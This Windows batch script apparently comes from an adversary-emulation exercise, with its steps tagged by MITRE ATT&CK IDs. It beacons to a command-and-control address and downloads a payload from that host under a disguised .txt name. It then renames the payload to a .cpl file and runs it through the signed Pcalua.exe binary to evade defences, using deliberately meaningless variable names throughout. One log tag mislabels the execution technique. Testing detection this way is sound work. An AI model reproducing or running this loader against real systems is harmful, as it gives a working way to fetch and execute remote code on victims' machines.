@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=%APPDATA%\8521\666a7490
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?8521-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=exploren.txt
SET rgnpbq=8521

REM Derived variables
SET uvxsf=%APPDATA%\%fkesh%\macula-simulations.log
SET mbqdy=%APPDATA%\%fkesh%
SET njlpv=Pcalua.exe

echo [%DATE% %TIME%][DEBUG][%eykalkg%]: script_started=1>> "%uvxsf%" 2>nul

REM C2 HEARTBEAT
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_start=1>> "%uvxsf%" 2>nul
curl -k -s -o nul "%frytcn%"
IF ERRORLEVEL 1 (
    SET jlwbt=0
    SET kpqrd=curl_failed
) ELSE (
    SET jlwbt=1
    SET kpqrd=
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: heartbeat_complete=%jlwbt%>> "%uvxsf%" 2>nul
echo [%DATE% %TIME%][%eykalkg%]: %fkesh%-%rgnpbq%-T1218|Signed_Binary_Proxy_Execution=%jlwbt%:%kpqrd%>> "%uvxsf%" 2>nul

REM Create output directory if needed
IF NOT EXIST "%douyiw%" (
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: mkdir_start=%douyiw%>> "%uvxsf%" 2>nul
    mkdir "%douyiw%" >nul 2>&1
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: mkdir_complete=1>> "%uvxsf%" 2>nul
)

REM Download DLL
SET mftsa=%douyiw%\%ecrfwq%
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: download_start=%ovbdjs%>> "%uvxsf%" 2>nul
curl -k -s -o "%mftsa%" "%ovbdjs%"
IF ERRORLEVEL 1 (
    SET dgmtf=0
    SET jfkxm=download_failed
) ELSE (
    SET dgmtf=1
    SET jfkxm=
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: download_complete=%dgmtf%>> "%uvxsf%" 2>nul
echo [%DATE% %TIME%][%eykalkg%]: %fkesh%-%rgnpbq%-T1105|Ingress_Tool_Transfer=%dgmtf%:%jfkxm%>> "%uvxsf%" 2>nul

IF NOT EXIST "%mftsa%" (
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: file_not_found=exit>> "%uvxsf%" 2>nul
    goto :eof
)

REM Rename to CPL
SET vhqca=%douyiw%\pcafile.cpl
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: rename_start=%mftsa%>> "%uvxsf%" 2>nul
rename "%mftsa%" pcafile.cpl >nul 2>&1
IF ERRORLEVEL 1 (
    SET wklxy=0
    SET nqbgp=rename_failed
) ELSE (
    SET wklxy=1
    SET nqbgp=
)
echo [%DATE% %TIME%][DEBUG][%eykalkg%]: rename_complete=%wklxy%>> "%uvxsf%" 2>nul
IF %wklxy% EQU 0 (
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: trying_copy_instead=1>> "%uvxsf%" 2>nul
    copy "%mftsa%" "%vhqca%" >nul 2>&1
    IF ERRORLEVEL 1 (
        SET wklxy=0
    ) ELSE (
        SET wklxy=1
    )
)

REM Execute via pcalua.exe
IF EXIST "%vhqca%" (
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: execution_start=%vhqca%>> "%uvxsf%" 2>nul
    "%njlpv%" -a "%vhqca%"
    IF ERRORLEVEL 1 (
        SET bpzth=0
        SET rqyvs=execution_failed
    ) ELSE (
        SET bpzth=1
        SET rqyvs=
    )
    echo [%DATE% %TIME%][DEBUG][%eykalkg%]: execution_complete=%bpzth%>> "%uvxsf%" 2>nul
    echo [%DATE% %TIME%][%eykalkg%]: %fkesh%-%rgnpbq%-T1218.001|Compiled_HTML_File=%bpzth%:%rqyvs%>> "%uvxsf%" 2>nul
)

echo [%DATE% %TIME%][DEBUG][%eykalkg%]: script_completed=1>> "%uvxsf%" 2>nul